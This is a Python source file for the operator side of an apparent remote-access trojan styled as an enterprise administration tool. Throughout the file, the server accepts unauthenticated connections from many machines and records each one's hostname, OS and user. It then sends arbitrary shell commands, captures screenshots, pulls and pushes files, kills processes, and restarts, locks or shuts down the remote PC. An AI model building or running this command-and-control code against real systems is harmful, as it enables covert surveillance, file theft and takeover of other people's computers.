import socket
import os
import json
import base64
import threading
import time
import logging
from datetime import datetime
from typing import Dict, Optional, Tuple

# Configuration
HOST = "0.0.0.0"
PORT = 5000
MAX_CLIENTS = 10
BUFFER_SIZE = 65536
TIMEOUT = 30.0

# Global state
clients: Dict[str, dict] = {}
active_client_id: Optional[str] = None
clients_lock = threading.Lock()
server_running = False

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('server.log'),
        logging.StreamHandler()
    ]
)

def print_banner():
    """Display enhanced banner with system info"""
    print("\n" + "="*80)
    print("  REMOTE ADMINISTRATION TOOL - Enterprise Edition v3.0")
    print("  Advanced Multi-Client Server with Enhanced Security")
    print("  Features: Screenshot | File Transfer | Process Control | System Management")
    print("="*80)
    print(f"  Server: {HOST}:{PORT} | Max Clients: {MAX_CLIENTS} | Logging: Enabled")
    print("="*80 + "\n")
    logging.info("Server banner displayed")

def print_menu():
    """Display menu"""
    print("\n" + "-"*80)
    print("QUICK COMMANDS:")
    print("  [1] ipconfig          [2] whoami           [3] dir")
    print("  [4] systeminfo        [5] tasklist         [6] cd")
    print("")
    print("ADVANCED FEATURES:")
    print("  [screenshot] - Capture client screen and save")
    print("  [download]   - Download file from client")
    print("  [upload]     - Upload file to client")
    print("  [sysinfo]    - Get detailed system information")
    print("")
    print("SYSTEM CONTROL:")
    print("  [restart]    - Restart client PC")
    print("  [shutdown]   - Shutdown client PC")
    print("  [lock]       - Lock client screen")
    print("")
    print("PROCESS CONTROL:")
    print("  [find]       - Find process by name")
    print("  [kill]       - Kill process by name")
    print("")
    print("CLIENT MANAGEMENT:")
    print("  [clients]    - List all connected clients")
    print("  [switch]     - Switch to different client")
    print("  [info]       - Show current client info")
    print("  [shutdown_client] - Terminate client process completely")
    print("")
    print("  [menu] - Show this menu  |  [exit] - Disconnect current client")
    print("-"*80 + "\n")

def list_clients():
    """Display all connected clients with enhanced info"""
    with clients_lock:
        if not clients:
            print("⚠️  No clients connected\n")
            logging.info("No clients connected")
            return
        
        print("\n" + "="*80)
        print(f"CONNECTED CLIENTS ({len(clients)}/{MAX_CLIENTS}):")
        print("="*80)
        for i, (client_id, data) in enumerate(clients.items(), 1):
            info = data.get("info", {})
            active = "🟢 ACTIVE" if client_id == active_client_id else "⚪"
            connected_time = data.get("connected_at", "Unknown")
            print(f"  [{i}] {active} {info.get('hostname', 'Unknown')} - {data['addr'][0]}:{data['addr'][1]}")
            print(f"      OS: {info.get('os', 'Unknown')} | User: {info.get('user', 'Unknown')}")
            print(f"      Connected: {connected_time}")
        print("="*80 + "\n")
        logging.info(f"Listed {len(clients)} connected clients")

def switch_client():
    """Switch to different client with validation"""
    global active_client_id
    
    with clients_lock:
        if not clients:
            print("⚠️  No clients connected\n")
            logging.warning("Switch client failed: No clients connected")
            return
    
    list_clients()
    
    try:
        choice = int(input("Select client number: "))
        with clients_lock:
            if 1 <= choice <= len(clients):
                old_client = active_client_id
                active_client_id = list(clients.keys())[choice - 1]
                info = clients[active_client_id].get("info", {})
                hostname = info.get('hostname', 'Unknown')
                ip = clients[active_client_id]['addr'][0]
                print(f"\n✓ Switched to: {hostname} ({ip})\n")
                logging.info(f"Switched from {old_client} to {active_client_id}")
            else:
                print("❌ Invalid choice\n")
                logging.warning(f"Invalid client choice: {choice}")
    except ValueError:
        print("❌ Invalid input - please enter a number\n")
        logging.error("Invalid input in switch_client")
    except Exception as e:
        print(f"❌ Error: {str(e)}\n")
        logging.error(f"Switch client error: {e}")

def capture_screenshot():
    """Capture and save screenshot with enhanced error handling"""
    if not active_client_id:
        print("⚠️  No active client\n")
        logging.warning("Screenshot failed: No active client")
        return
    
    try:
        with clients_lock:
            if active_client_id not in clients:
                print("⚠️  Client disconnected\n")
                logging.error("Screenshot failed: Client disconnected")
                return
            conn = clients[active_client_id]["conn"]
            hostname = clients[active_client_id].get("info", {}).get("hostname", "Unknown")
        
        print("📸 Requesting screenshot...")
        logging.info(f"Requesting screenshot from {hostname}")
        
        conn.send("SCREENSHOT".encode())
        
        # Receive data in chunks with progress
        all_data = b""
        conn.settimeout(15.0)
        chunk_count = 0
        
        while True:
            try:
                chunk = conn.recv(BUFFER_SIZE)
                if not chunk:
                    break
                all_data += chunk
                chunk_count += 1
                
                # Show progress for large transfers
                if chunk_count % 10 == 0:
                    print(f"  Receiving... {len(all_data) // 1024}KB")
                
                if b'}' in chunk:
                    break
            except socket.timeout:
                logging.warning("Screenshot receive timeout")
                break
        
        if not all_data:
            print("❌ No data received\n")
            logging.error("Screenshot failed: No data received")
            return
        
        response = json.loads(all_data.decode())
        
        if response.get("status") == "success":
            img_data = base64.b64decode(response.get("data"))
            
            # Create screenshots directory if not exists
            os.makedirs("screenshots", exist_ok=True)
            filename = f"screenshots/screenshot_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            
            with open(filename, 'wb') as f:
                f.write(img_data)
            
            size_mb = len(img_data) / (1024 * 1024)
            print(f"✓ Screenshot saved: {filename} ({size_mb:.2f}MB)\n")
            logging.info(f"Screenshot saved: {filename} ({size_mb:.2f}MB)")
        else:
            error_msg = response.get('message', 'Unknown error')
            print(f"❌ Screenshot failed: {error_msg}\n")
            logging.error(f"Screenshot failed: {error_msg}")
    
    except json.JSONDecodeError as e:
        print(f"❌ Invalid response format\n")
        logging.error(f"Screenshot JSON decode error: {e}")
    except Exception as e:
        print(f"❌ Error: {str(e)}\n")
        logging.error(f"Screenshot error: {e}")

def download_file():
    """Download file from client with progress tracking"""
    if not active_client_id:
        print("⚠️  No active client\n")
        logging.warning("Download failed: No active client")
        return
    
    filepath = input("Enter file path on client (e.g., C:\\file.txt): ").strip()
    if not filepath:
        return
    
    try:
        with clients_lock:
            if active_client_id not in clients:
                print("⚠️  Client disconnected\n")
                logging.error("Download failed: Client disconnected")
                return
            conn = clients[active_client_id]["conn"]
            hostname = clients[active_client_id].get("info", {}).get("hostname", "Unknown")
        
        print(f"📥 Downloading {filepath}...")
        logging.info(f"Downloading {filepath} from {hostname}")
        
        conn.send(f"DOWNLOAD:{filepath}".encode())
        
        # Receive large files in chunks with progress
        all_data = b""
        conn.settimeout(TIMEOUT)
        chunk_count = 0
        
        while True:
            try:
                chunk = conn.recv(BUFFER_SIZE)
                if not chunk:
                    break
                all_data += chunk
                chunk_count += 1
                
                # Show progress
                if chunk_count % 10 == 0:
                    print(f"  Receiving... {len(all_data) // 1024}KB")
                
                if b'}' in chunk:
                    break
            except socket.timeout:
                logging.warning("Download receive timeout")
                break
        
        if not all_data:
            print("❌ No data received\n")
            logging.error("Download failed: No data received")
            return
        
        response = json.loads(all_data.decode())
        
        if response.get("status") == "success":
            file_data = base64.b64decode(response.get("data"))
            filename = response.get("filename")
            
            # Create downloads directory
            os.makedirs("downloads", exist_ok=True)
            save_path = f"downloads/{filename}"
            
            with open(save_path, 'wb') as f:
                f.write(file_data)
            
            size_mb = len(file_data) / (1024 * 1024)
            print(f"✓ File downloaded: {save_path} ({size_mb:.2f}MB)\n")
            logging.info(f"File downloaded: {save_path} ({size_mb:.2f}MB)")
        else:
            error_msg = response.get('message', 'Unknown error')
            print(f"❌ Download failed: {error_msg}\n")
            logging.error(f"Download failed: {error_msg}")
    
    except json.JSONDecodeError as e:
        print(f"❌ Invalid response format\n")
        logging.error(f"Download JSON decode error: {e}")
    except Exception as e:
        print(f"❌ Error: {str(e)}\n")
        logging.error(f"Download error: {e}")

def upload_file():
    """Upload file to client with validation and progress"""
    if not active_client_id:
        print("⚠️  No active client\n")
        logging.warning("Upload failed: No active client")
        return
    
    filepath = input("Enter local file path to upload: ").strip()
    if not filepath:
        return
    
    if not os.path.exists(filepath):
        print("❌ File not found\n")
        logging.error(f"Upload failed: File not found - {filepath}")
        return
    
    if not os.path.isfile(filepath):
        print("❌ Path is not a file\n")
        logging.error(f"Upload failed: Not a file - {filepath}")
        return
    
    # Check file size
    file_size = os.path.getsize(filepath)
    max_size = 50 * 1024 * 1024  # 50MB limit
    
    if file_size > max_size:
        print(f"❌ File too large: {file_size / (1024*1024):.2f}MB (max 50MB)\n")
        logging.error(f"Upload failed: File too large - {file_size / (1024*1024):.2f}MB")
        return
    
    try:
        with clients_lock:
            if active_client_id not in clients:
                print("⚠️  Client disconnected\n")
                logging.error("Upload failed: Client disconnected")
                return
            conn = clients[active_client_id]["conn"]
            hostname = clients[active_client_id].get("info", {}).get("hostname", "Unknown")
        
        filename = os.path.basename(filepath)
        print(f"📤 Uploading {filename} ({file_size / 1024:.2f}KB) to {hostname}...")
        logging.info(f"Uploading {filename} ({file_size / 1024:.2f}KB) to {hostname}")
        
        with open(filepath, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode()
        
        cmd = f"UPLOAD:{filename}:{file_data}"
        conn.send(cmd.encode())
        
        conn.settimeout(10.0)
        data = conn.recv(4096)
        response = json.loads(data.decode())
        
        if response.get("status") == "success":
            msg = response.get('message', 'Upload successful')
            print(f"✓ {msg}\n")
            logging.info(f"Upload successful: {filename}")
        else:
            error_msg = response.get('message', 'Unknown error')
            print(f"❌ Upload failed: {error_msg}\n")
            logging.error(f"Upload failed: {error_msg}")
    
    except json.JSONDecodeError as e:
        print(f"❌ Invalid response format\n")
        logging.error(f"Upload JSON decode error: {e}")
    except Exception as e:
        print(f"❌ Error: {str(e)}\n")
        logging.error(f"Upload error: {e}")

def accept_clients():
    """Accept multiple clients with enhanced error handling and validation"""
    global server_running
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(MAX_CLIENTS)
        server_running = True
        
        print(f"✓ Server started on {HOST}:{PORT}")
        print(f"  Max clients: {MAX_CLIENTS} | Timeout: {TIMEOUT}s")
        print("Waiting for client connections...\n")
        logging.info(f"Server started on {HOST}:{PORT}")
        
        while server_running:
            try:
                conn, addr = server_socket.accept()
                
                # Check max clients limit
                with clients_lock:
                    if len(clients) >= MAX_CLIENTS:
                        print(f"⚠️  Max clients reached ({MAX_CLIENTS}), rejecting {addr[0]}")
                        logging.warning(f"Max clients reached, rejecting {addr[0]}")
                        conn.close()
                        continue
                
                # Receive client info with timeout
                conn.settimeout(10.0)
                try:
                    data = conn.recv(4096).decode('utf-8', errors='ignore')
                    if data:
                        client_info = json.loads(data)
                    else:
                        client_info = {"hostname": "Unknown", "os": "Unknown", "user": "Unknown"}
                except socket.timeout:
                    logging.warning(f"Client info timeout from {addr[0]}")
                    client_info = {"hostname": "Unknown", "os": "Unknown", "user": "Unknown"}
                except json.JSONDecodeError as e:
                    logging.error(f"Invalid client info JSON from {addr[0]}: {e}")
                    client_info = {"hostname": "Unknown", "os": "Unknown", "user": "Unknown"}
                
                # Reset timeout
                conn.settimeout(None)
                
                client_id = f"{addr[0]}:{addr[1]}"
                
                with clients_lock:
                    clients[client_id] = {
                        "conn": conn,
                        "addr": addr,
                        "info": client_info,
                        "connected_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    total = len(clients)
                
                hostname = client_info.get('hostname', 'Unknown')
                os_info = client_info.get('os', 'Unknown')
                print(f"✓ Client connected: {hostname} ({os_info}) from {addr[0]}")
                print(f"  Total clients: {total}/{MAX_CLIENTS}\n")
                logging.info(f"Client connected: {hostname} from {addr[0]} (Total: {total})")
                
            except OSError as e:
                if server_running:
                    logging.error(f"Accept error: {e}")
                break
            except Exception as e:
                if server_running:
                    logging.error(f"Unexpected accept error: {e}")
    
    except OSError as e:
        print(f"❌ Server bind error: {e}")
        print(f"   Port {PORT} may already be in use")
        logging.error(f"Server bind error: {e}")
    except Exception as e:
        logging.error(f"Server error: {e}")
    finally:
        server_running = False
        try:
            server_socket.close()
        except:
            pass
        logging.info("Server stopped")

# Start server in background
print_banner()
threading.Thread(target=accept_clients, daemon=True).start()
time.sleep(1)

# Wait for first client
print("Waiting for first client to connect...")
while True:
    with clients_lock:
        if clients:
            break
    time.sleep(0.5)

# Auto-select first client
with clients_lock:
    active_client_id = list(clients.keys())[0]
    info = clients[active_client_id].get("info", {})
    addr = clients[active_client_id]['addr'][0]
print(f"\n✓ Auto-selected: {info.get('hostname', 'Unknown')} ({addr})")

print_menu()

# Main command loop
while True:
    try:
        with clients_lock:
            if not active_client_id or active_client_id not in clients:
                if clients:
                    active_client_id = list(clients.keys())[0]
                else:
                    print("⚠️  No clients connected. Waiting...")
        
        if not active_client_id:
            while True:
                with clients_lock:
                    if clients:
                        active_client_id = list(clients.keys())[0]
                        break
                time.sleep(1)
        
        cmd = input("Remote-Admin> ")
        
        if not cmd:
            continue
        
        # Handle shortcuts
        if cmd == "menu":
            print_menu()
            continue
        elif cmd == "clients":
            list_clients()
            continue
        elif cmd == "switch":
            switch_client()
            continue
        elif cmd == "screenshot":
            capture_screenshot()
            continue
        elif cmd == "download":
            download_file()
            continue
        elif cmd == "upload":
            upload_file()
            continue
        elif cmd == "1":
            cmd = "ipconfig"
        elif cmd == "2":
            cmd = "whoami"
        elif cmd == "3":
            cmd = "dir"
        elif cmd == "4":
            cmd = "systeminfo"
        elif cmd == "5":
            cmd = "tasklist"
        elif cmd == "6":
            cmd = "cd"
        elif cmd == "info":
            with clients_lock:
                if active_client_id in clients:
                    info = clients[active_client_id].get("info", {})
                    addr = clients[active_client_id]['addr']
                    print(f"\n{'='*80}")
                    print("CURRENT CLIENT INFO:")
                    print(f"{'='*80}")
                    print(f"  Hostname: {info.get('hostname', 'Unknown')}")
                    print(f"  OS: {info.get('os', 'Unknown')}")
                    print(f"  User: {info.get('user', 'Unknown')}")
                    print(f"  IP: {addr[0]}")
                    print(f"  Port: {addr[1]}")
                    print(f"{'='*80}\n")
                else:
                    print("⚠️  Client disconnected\n")
            continue
        elif cmd == "sysinfo":
            cmd = "SYSINFO"
        elif cmd == "restart":
            confirm = input("⚠️  Restart client PC? (yes/no): ")
            if confirm.lower() != "yes":
                print("Cancelled.\n")
                continue
            cmd = "shutdown /r /t 0"
        elif cmd == "shutdown":
            confirm = input("⚠️  Shutdown client PC? (yes/no): ")
            if confirm.lower() != "yes":
                print("Cancelled.\n")
                continue
            cmd = "shutdown /s /t 0"
        elif cmd == "lock":
            cmd = "rundll32.exe user32.dll,LockWorkStation"
        elif cmd == "find":
            process = input("Process name: ")
            if process:
                cmd = f"tasklist | findstr {process}"
        elif cmd == "kill":
            process = input("Process name (e.g., notepad.exe): ")
            if process:
                confirm = input(f"⚠️  Kill {process}? (yes/no): ")
                if confirm.lower() == "yes":
                    cmd = f"taskkill /F /IM {process}"
                else:
                    print("Cancelled.\n")
                    continue
        
        # Send command
        try:
            with clients_lock:
                if active_client_id not in clients:
                    print("⚠️  Client disconnected\n")
                    active_client_id = None
                    continue
                conn = clients[active_client_id]["conn"]
            conn.send(cmd.encode())
        except Exception as e:
            print(f"❌ Failed to send command: {str(e)}")
            print("⚠️  Client may have disconnected\n")
            with clients_lock:
                if active_client_id in clients:
                    del clients[active_client_id]
            active_client_id = None
            continue
        
        if cmd.lower() == "exit":
            print("✓ Disconnecting client...\n")
            try:
                conn.close()
            except:
                pass
            
            with clients_lock:
                if active_client_id in clients:
                    del clients[active_client_id]
                active_client_id = None
                
                if clients:
                    active_client_id = list(clients.keys())[0]
                    info = clients[active_client_id].get("info", {})
                    print(f"✓ Switched to: {info.get('hostname', 'Unknown')}\n")
            
            if not active_client_id:
                print("⚠️  No more clients. Waiting for new connection...\n")
                while True:
                    with clients_lock:
                        if clients:
                            active_client_id = list(clients.keys())[0]
                            info = clients[active_client_id].get("info", {})
                            print(f"✓ New client connected: {info.get('hostname', 'Unknown')}\n")
                            break
                    time.sleep(1)
            continue
        
        elif cmd.lower() == "shutdown_client":
            print("🔴 Terminating client process...\n")
            try:
                conn.send("shutdown_client".encode())
                time.sleep(0.5)
                conn.close()
            except:
                pass
            
            with clients_lock:
                if active_client_id in clients:
                    del clients[active_client_id]
                active_client_id = None
                
                if clients:
                    active_client_id = list(clients.keys())[0]
                    info = clients[active_client_id].get("info", {})
                    print(f"✓ Switched to: {info.get('hostname', 'Unknown')}\n")
            
            if not active_client_id:
                print("⚠️  No more clients. Waiting for new connection...\n")
                while True:
                    with clients_lock:
                        if clients:
                            active_client_id = list(clients.keys())[0]
                            info = clients[active_client_id].get("info", {})
                            print(f"✓ New client connected: {info.get('hostname', 'Unknown')}\n")
                            break
                    time.sleep(1)
            continue
        
        # Receive response with timeout
        conn.settimeout(10.0)
        try:
            data = conn.recv(65536)
        except socket.timeout:
            print("⚠️  Command timeout\n")
            continue
        
        if not data:
            print("⚠️  Client disconnected unexpectedly\n")
            try:
                conn.close()
            except:
                pass
            
            with clients_lock:
                if active_client_id in clients:
                    del clients[active_client_id]
                active_client_id = None
                
                if clients:
                    active_client_id = list(clients.keys())[0]
            continue
        
        output = data.decode(errors="ignore")
        
        # Check for JSON response
        try:
            response = json.loads(output)
            resp_type = response.get("type", "")
            
            if resp_type == "SCREENSHOT":
                if response.get("status") == "success":
                    img_data = base64.b64decode(response.get("data"))
                    filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                    with open(filename, 'wb') as f:
                        f.write(img_data)
                    print(f"\n✓ Screenshot saved: {filename}\n")
                else:
                    print(f"\n❌ {response.get('message')}\n")
            
            elif resp_type == "DOWNLOAD":
                if response.get("status") == "success":
                    file_data = base64.b64decode(response.get("data"))
                    filename = response.get("filename")
                    with open(filename, 'wb') as f:
                        f.write(file_data)
                    print(f"\n✓ Downloaded: {filename} ({len(file_data)} bytes)\n")
                else:
                    print(f"\n❌ {response.get('message')}\n")
            
            elif resp_type == "UPLOAD":
                print(f"\n✓ {response.get('message')}\n")
            
            elif resp_type == "SYSINFO":
                print(f"\n{json.dumps(response, indent=2)}\n")
            
            else:
                print("\n" + "-"*80)
                print(json.dumps(response, indent=2))
                print("-"*80 + "\n")
        
        except:
            # Regular output
            print("\n" + "-"*80)
            print(output)
            print("-"*80 + "\n")
    
    except KeyboardInterrupt:
        print("\n\n✓ Server shutting down...")
        break
    except Exception as e:
        print(f"❌ Error: {str(e)}\n")

print("Server stopped.")
